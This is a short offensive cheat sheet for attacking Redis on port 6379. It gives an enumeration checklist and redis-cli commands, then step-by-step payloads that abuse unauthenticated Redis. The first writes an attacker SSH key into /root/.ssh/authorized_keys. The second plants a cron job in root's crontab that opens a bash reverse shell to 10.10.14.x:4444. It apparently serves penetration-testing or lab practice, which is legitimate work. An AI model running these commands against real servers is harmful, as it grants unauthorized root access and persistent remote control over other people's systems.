# Redis

**Port:** 6379

**Quick Checklist**
- [ ] Unauthenticated?
- [ ] Can write files?
- [ ] SSH key injection possible?

```bash
redis-cli -h IP
INFO
CONFIG GET dir
CONFIG GET dbfilename
```

**SSH Key Injection**
```bash
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") | redis-cli -h IP -x SET ssh_key
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SAVE
```

**Cron Persistence**
```bash
set cron "\n\n* * * * * bash -i >& /dev/tcp/10.10.14.x/4444 0>&1\n\n"
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SAVE
```
